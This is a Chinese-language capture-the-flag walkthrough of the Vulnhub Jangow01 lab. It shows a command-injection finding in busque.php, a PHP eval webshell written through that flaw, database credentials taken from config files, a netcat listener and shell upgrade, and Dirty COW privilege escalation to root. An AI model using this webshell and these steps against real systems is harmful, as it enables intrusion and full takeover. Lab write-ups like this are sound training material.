# Vulnhub-jangow01-Wp

------

参考链接：https://mi3aka.eu.org/2021/12/01/vulnhub-Jangow_1.0.1/

​					https://blog.csdn.net/weixin_43784056/article/details/123344325

---------

------

1.由于官网上下的vul是virtualbox版本的，使用vm workstations打开会获取不到ip，所以环境是：kali-192.168.159.132，jangow01：192.168.56.118

2.主机探测
    nmap -sP 192.168.56.0/24

3.端口探测

​	nmap -sV -p 0-10000 192.168.56.118

​	查看到服务器开放了21、80端口

4.访问http服务，并用xray扫描网站 $./xray-linux-amd64 webscan --basic-crawler http://192.168.56.118/site/

```
[Vuln: cmd-injection]
Target           "http://192.168.56.118/site/busque.php?buscar="                      
VulnType         "injection/cmd"                                                      
Payload          "\nexpr 954511378 + 970141089\n"                                     
Position         "query"                                                              
ParamKey         "buscar"                                                             
ParamValue       "\nexpr 954511378 + 970141089\n"                                     
feature          "1924652467"                                                         
type             "echo_based"                                                         
```

扫描到命令注入

5.尝试写入webshell

```
echo '<?php eval($_POST[a]);?>' > a.php
```

![image-20220327131314586](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20220327131314586.png)

成功插入

6.可以查看上传一句话木马的地址

![image-20220327134438629](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20220327134438629.png)

7.使用蚁剑上线，查看到文件管理界面

![image-20220327134731122](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20220327134731122.png)

8.发现config文件

```
<?php
$servername = "localhost";
$database = "desafio02";
$username = "desafio02";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
?>
```

但这个账密不正确

另一个.backup文件

```
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
```

可以成功登录，用户态为普通用户

9.由于是在两个软件中的虚拟机，发现只有kali能ping通vul，但vul没法pingkali，想不到怎么解决

后面的流程参考别人的

10.若成功反弹shell ：nc -lvnp 443

11.执行稳定的shell ：`python3 -c 'import pty;pty.spawn("/bin/bash")'`

12 查看靶机环境 : ubuntu16.04 ：uname -a

13.kali搜索poc ：searchexploit ubuntu 16.04

14使用CVE-2016-5195提权，

$whoami

root

